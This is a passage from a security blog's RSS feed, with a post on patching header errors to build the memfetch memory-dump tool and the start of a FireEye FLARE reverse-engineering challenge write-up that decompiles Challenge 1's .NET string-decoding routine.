      <description>&lt;p&gt;I&amp;rsquo;ve used Disqus to add comments. At the moment, guests can comment and comments do not need to be approved (unless they have links). Hopefully there won&amp;rsquo;t be much spam to sink the ocassional comment that I think will be posted.&lt;/p&gt;

&lt;p&gt;Note: I just wanted to make it work in a hurry. There are probably better ways of doing this.&lt;/p&gt;

&lt;p&gt;I stumbled upon the very useful tool &lt;a href=&#34;http://lcamtuf.coredump.cx/soft/memfetch.tgz&#34; target=&#34;_blank&#34;&gt;memfetch&lt;/a&gt; by the talented &lt;em&gt;lcamtuf&lt;/em&gt;. The utility is quite old (from 2003 if I recall correctly) and I could not build it using the provided makefile.&lt;/p&gt;




    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;errors while building memfetch&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;1
2
3
4
5&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;$ make
gcc -Wall -O9    memfetch.c   -o memfetch
memfetch.c:30:22: fatal error: asm/page.h: No such file or directory
compilation terminated.
make: *** &lt;span style=&#34;color: #719e07&#34;&gt;[&lt;/span&gt;memfetch&lt;span style=&#34;color: #719e07&#34;&gt;]&lt;/span&gt; Error 1
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;


&lt;p&gt;Seems like the location of header files have moved since then. &lt;a href=&#34;http://stackoverflow.com/a/19310710&#34; target=&#34;_blank&#34;&gt;This stackoverflow answer&lt;/a&gt; mentions removing &lt;code&gt;asm/page.h&lt;/code&gt; and adding &lt;code&gt;linux/types.h&lt;/code&gt;. Let&amp;rsquo;s see what happens now:&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;more errors&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;1
2
3
4
5
6&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;$ make
gcc -Wall -O9    memfetch.c   -o memfetch
memfetch.c: In &lt;span style=&#34;color: #719e07&#34;&gt;function&lt;/span&gt; ‘main’:
memfetch.c:284:25: error: ‘PAGE_SIZE’ undeclared &lt;span style=&#34;color: #719e07&#34;&gt;(&lt;/span&gt;first use in this &lt;span style=&#34;color: #719e07&#34;&gt;function)&lt;/span&gt;
memfetch.c:284:25: note: each undeclared identifier is reported only once &lt;span style=&#34;color: #719e07&#34;&gt;for&lt;/span&gt; each &lt;span style=&#34;color: #719e07&#34;&gt;function&lt;/span&gt; it appears in
make: *** &lt;span style=&#34;color: #719e07&#34;&gt;[&lt;/span&gt;memfetch&lt;span style=&#34;color: #719e07&#34;&gt;]&lt;/span&gt; Error 1
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;The &lt;code&gt;page.h&lt;/code&gt; file is located at &lt;code&gt;/usr/src/linux-headers-3.12-kali1-common/include/asm-generic/page.h&lt;/code&gt; on Kali linux. This is where &lt;code&gt;PAGE_SIZE&lt;/code&gt; is defined. Just adding it to &lt;code&gt;memfetch.c&lt;/code&gt; along with changing &lt;code&gt;#include &amp;lt;asm/page.h&amp;gt;&lt;/code&gt; to &lt;code&gt;#include &amp;lt;linux/types.h&amp;gt;&lt;/code&gt; will do the trick.&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;additions to memfetch.c&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;// &lt;span style=&#34;color: #586E75&#34;&gt;#include &amp;lt;asm/page.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt;#include &amp;lt;linux/types.h&amp;gt;&lt;/span&gt;

// Copied from asm-generic/page.h
/* PAGE_SHIFT determines the page size */
&lt;span style=&#34;color: #586E75&#34;&gt;#define PAGE_SHIFT	12&lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt;#ifdef __ASSEMBLY__&lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt;#define PAGE_SIZE	(1 &amp;lt;&amp;lt; PAGE_SHIFT)&lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt;#else&lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt;#define PAGE_SIZE	(1UL &amp;lt;&amp;lt; PAGE_SHIFT)&lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt;#endif&lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt;#define PAGE_MASK	(~(PAGE_SIZE-1))&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;If there is a better way to make this work, please let me know.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>My Adventure with Fireeye FLARE Challenge</title>
      <link>http://parsiya.net/blog/2014-09-23-My-Adventure-with-Fireeye-FLARE-Challenge/</link>
      <pubDate>Tue, 23 Sep 2014 02:31:44 +0000</pubDate>
      
      <guid>http://parsiya.net/blog/2014-09-23-My-Adventure-with-Fireeye-FLARE-Challenge/</guid>
      <description>

&lt;p&gt;These are my (rather long) solutions to Fireeye&amp;rsquo;s FLARE challenge. This is just not the solution but other ways that I tried. This was a great learning experience for me so I am writing this post to document everything I tried. As a result, this post is somewhat long.&lt;/p&gt;

&lt;p&gt;If you have any feedback, please let me know. I spent a lot of time on this writeup and I am always happy to learn new stuff. My email and twitter handle are in the sidebar.&lt;/p&gt;

&lt;p&gt;I am a bit late to the party. There &lt;del&gt;were two&lt;/del&gt; are now other three solutions posted (that I know of). Check them out.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.codeandsec.com/Detailed-Solutions-to-FireEye-FLARE-Challenge&#34; target=&#34;_blank&#34;&gt;Detailed Solutions to FireEye FLARE Challenge&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.ghettoforensics.com/2014/09/a-walkthrough-for-flare-re-challenges.html&#34; target=&#34;_blank&#34;&gt;A Walk through for FLARE RE Challenges&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;The FLARE On Challenge Solutions by Fireye

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://www.fireeye.com/blog/technical/cyber-exploits/2014/11/the-flare-on-challenge-solutions-part-1-of-2.html&#34; target=&#34;_blank&#34;&gt;Part 1 - solutions for challenges 1 to 5&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.fireeye.com/blog/threat-research/2014/11/flare_on_challengep.html&#34; target=&#34;_blank&#34;&gt;Part 2 - solutions for challenges 6 and 7&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;links-to-individual-challenges:94bf06dd1bee42f6b34a1ff79274f7e7&#34;&gt;Links to Individual Challenges&lt;/h3&gt;

&lt;p&gt;This post is quite long (I didn&amp;rsquo;t want to strip them into different posts), use the following links to jump to any specific challenge:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#ch1&#34;&gt;Challenge 1&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#ch2&#34;&gt;Challenge 2&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#ch3&#34;&gt;Challenge 3&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#ch4&#34;&gt;Challenge 4&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#ch5&#34;&gt;Challenge 5&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#ch6&#34;&gt;Challenge 6&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#ch7&#34;&gt;Challenge 7&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;my-setup:94bf06dd1bee42f6b34a1ff79274f7e7&#34;&gt;My Setup&lt;/h3&gt;

&lt;p&gt;I used a Windows XP SP3 Virtual Machine for most challenges using VirtualBox. For challenge 6 I used a Kali 64-bit VM. I used IDA/Immunity on my host OS with some other utilities.&lt;/p&gt;

&lt;h3 id=&#34;helpful-tools:94bf06dd1bee42f6b34a1ff79274f7e7&#34;&gt;Helpful Tools&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://www.7-zip.org/download.html&#34; target=&#34;_blank&#34;&gt;7-zip&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.winitor.com/&#34; target=&#34;_blank&#34;&gt;PE-Studio&lt;/a&gt;: Gain information about the binary &lt;strong&gt;without running it.&lt;/strong&gt; It also sends a hash (MD5 I think) of the file to Virustotal so if you want to keep your samples secret, don&amp;rsquo;t give it internet access&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.jetbrains.com/decompiler/&#34; target=&#34;_blank&#34;&gt;dotPeek&lt;/a&gt;: Free .NET decompiler by JetBrains&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.red-gate.com/products/dotnet-development/reflector/&#34; target=&#34;_blank&#34;&gt;.NET Reflector&lt;/a&gt;: .NET decompiler. Not free but comes with a 2-week trial period&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://mh-nexus.de/en/downloads.php?product=HxD&#34; target=&#34;_blank&#34;&gt;HxD&lt;/a&gt;: Free Windows hex editor&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://notepad-plus-plus.org/&#34; target=&#34;_blank&#34;&gt;Notepad++&lt;/a&gt;: Slick FOSS text-editor&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://debugger.immunityinc.com/ID_register.py&#34; target=&#34;_blank&#34;&gt;Immunity Debugger&lt;/a&gt;: Windows debugger. Very similar to &lt;a href=&#34;http://www.ollydbg.de/&#34; target=&#34;_blank&#34;&gt;OllyDbg&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://code.google.com/p/pyew/&#34; target=&#34;_blank&#34;&gt;pyew&lt;/a&gt;: A Python tool for static malware analysis. I used it for PDF analysis&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.hex-rays.com/products/ida/&#34; target=&#34;_blank&#34;&gt;IDA&lt;/a&gt;: What can I say? It&amp;rsquo;s great but also costs an arm and a leg. Except challenge 6, the trial and free version are enough for us&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://home.gna.org/bless/&#34; target=&#34;_blank&#34;&gt;Bless&lt;/a&gt;: Linux Hex editor&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.rohitab.com/apimonitor&#34; target=&#34;_blank&#34;&gt;API Monitor&lt;/a&gt;: Free utility to monitor API calls in Windows. It can monitor calls for standard windows APIs or we can add application-specific Dlls and monitor them&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.wireshark.org/download.html&#34; target=&#34;_blank&#34;&gt;Wireshark&lt;/a&gt;: FOSS network monitoring/capturing tool. Needs administrator access on Windows to install libpcap&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.microsoft.com/en-us/download/details.aspx?id=4865&#34; target=&#34;_blank&#34;&gt;Microsoft Network Monitor&lt;/a&gt;: Microsoft network monitoring/capturing tool. Does not need administrator access. Replaced by &lt;a href=&#34;http://www.microsoft.com/en-us/download/details.aspx?id=40308&#34; target=&#34;_blank&#34;&gt;Microsoft Message Analyzer&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h2 id=&#34;a-name-ch1-a-challenge-1-bob-roge:94bf06dd1bee42f6b34a1ff79274f7e7&#34;&gt;&lt;a name=&#34;ch1&#34;&gt;&lt;/a&gt; Challenge 1 - Bob Roge&lt;/h2&gt;

&lt;p&gt;The challenge starts with going to their website at &lt;a href=&#34;http://flare-on.com&#34; target=&#34;_blank&#34;&gt;http://flare-on.com&lt;/a&gt; and downloading a binary. The binary is a self-extracting zip file which is supposed to show you the challenge EULA. It didn&amp;rsquo;t work on my VM.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://parsiya.net/images/2014/flare/1-1.jpg&#34; alt=&#34;Self-Extracting zip failed :(&#34; title=&#34;Self-Extracting zip failed :(&#34; /&gt;&lt;/p&gt;

&lt;p&gt;I opened it with &lt;code&gt;7-zip&lt;/code&gt; to get &lt;code&gt;Challenge1.exe&lt;/code&gt;. By dropping it into &lt;code&gt;PE-Studio&lt;/code&gt; I gained more information:&lt;/p&gt;
&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;The Image is a fake Microsoft executable    # Company name is Microsoft but it is not signed?
The Manifest Identity name (MyApplication.app) is different than the Image name
The Version Information &amp;#39;OriginalFilename&amp;#39; (rev_challenge_1.exe) is different than the Image name
The Debug Symbol File Name () is different than the Image name (challenge1)
The image is Managed (.NET)
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;So it appears to be a .Net binary. Let&amp;rsquo;s run it.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://parsiya.net/images/2014/flare/1-2.jpg&#34; alt=&#34;Challenge 1 executed&#34; title=&#34;Challenge 1 executed&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Hey I love this guy. Let&amp;rsquo;s press &lt;code&gt;DECODE.&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://parsiya.net/images/2014/flare/1-3.jpg&#34; alt=&#34;Much decode&#34; title=&#34;Much decode&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Look at that garbled data. We can decompile it (remember it&amp;rsquo;s a .Net binary). Using &lt;code&gt;dotPeek&lt;/code&gt; we can see the code for &lt;code&gt;Decode&lt;/code&gt; button:&lt;/p&gt;




    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;btnDecode_click&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #719e07&#34;&gt;private&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;btnDecode_Click&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #DC322F&#34;&gt;object&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;sender,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;EventArgs&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;e)&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;{&lt;/span&gt;
  &lt;span style=&#34;color: #719e07&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;.pbRoge.Image&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(Image)&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;Resources.bob_roge;&lt;/span&gt; &lt;span style=&#34;color: #586E75&#34;&gt;// change the image&lt;/span&gt;
  &lt;span style=&#34;color: #DC322F&#34;&gt;byte&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;[]&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;datSecret&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;Resources.dat_secret;&lt;/span&gt;        &lt;span style=&#34;color: #586E75&#34;&gt;// interesting&lt;/span&gt;
  &lt;span style=&#34;color: #DC322F&#34;&gt;string&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;str1&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;;&lt;/span&gt;
  &lt;span style=&#34;color: #719e07&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #DC322F&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;index&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;;&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;index&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;datSecret.Length;&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;++index)&lt;/span&gt;
  &lt;span style=&#34;color: #93A1A1&#34;&gt;{&lt;/span&gt;
	&lt;span style=&#34;color: #DC322F&#34;&gt;byte&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;num&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;datSecret[index];&lt;/span&gt;
	&lt;span style=&#34;color: #93A1A1&#34;&gt;str1&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;str1&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #DC322F&#34;&gt;object&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #DC322F&#34;&gt;char&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(((&lt;/span&gt;&lt;span style=&#34;color: #DC322F&#34;&gt;int&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;num&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;4&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;|&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #DC322F&#34;&gt;int&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;num&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;4&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;240&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;^&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;41&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;);&lt;/span&gt;
  &lt;span style=&#34;color: #93A1A1&#34;&gt;}&lt;/span&gt;
  &lt;span style=&#34;color: #DC322F&#34;&gt;string&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;str2&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;str1&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;\0&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;;&lt;/span&gt;
  &lt;span style=&#34;color: #DC322F&#34;&gt;string&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;str3&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;;&lt;/span&gt;
  &lt;span style=&#34;color: #DC322F&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;index1&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;;&lt;/span&gt;
  &lt;span style=&#34;color: #719e07&#34;&gt;while&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(index1&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;str2.Length)&lt;/span&gt;
  &lt;span style=&#34;color: #93A1A1&#34;&gt;{&lt;/span&gt;
	&lt;span style=&#34;color: #93A1A1&#34;&gt;str3&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;str3&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #DC322F&#34;&gt;object&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;str2[index1&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #DC322F&#34;&gt;object&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;str2[index1];&lt;/span&gt;
	&lt;span style=&#34;color: #93A1A1&#34;&gt;index1&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;;&lt;/span&gt;
  &lt;span style=&#34;color: #93A1A1&#34;&gt;}&lt;/span&gt;
  &lt;span style=&#34;color: #DC322F&#34;&gt;string&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;str4&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;;&lt;/span&gt;
  &lt;span style=&#34;color: #719e07&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #DC322F&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;index2&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;;&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;index2&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;str3.Length;&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;++index2)&lt;/span&gt;
  &lt;span style=&#34;color: #93A1A1&#34;&gt;{&lt;/span&gt;
	&lt;span style=&#34;color: #DC322F&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;num&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #DC322F&#34;&gt;int&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;str3[index2];&lt;/span&gt;
	&lt;span style=&#34;color: #93A1A1&#34;&gt;str4&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;str4&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #DC322F&#34;&gt;object&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #DC322F&#34;&gt;char&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;((&lt;/span&gt;&lt;span style=&#34;color: #DC322F&#34;&gt;uint&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #DC322F&#34;&gt;byte&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;str3[index2]&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;^&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;102&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;U);&lt;/span&gt;
  &lt;span style=&#34;color: #93A1A1&#34;&gt;}&lt;/span&gt;
  &lt;span style=&#34;color: #719e07&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;.lbl_title.Text&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;str4;&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;


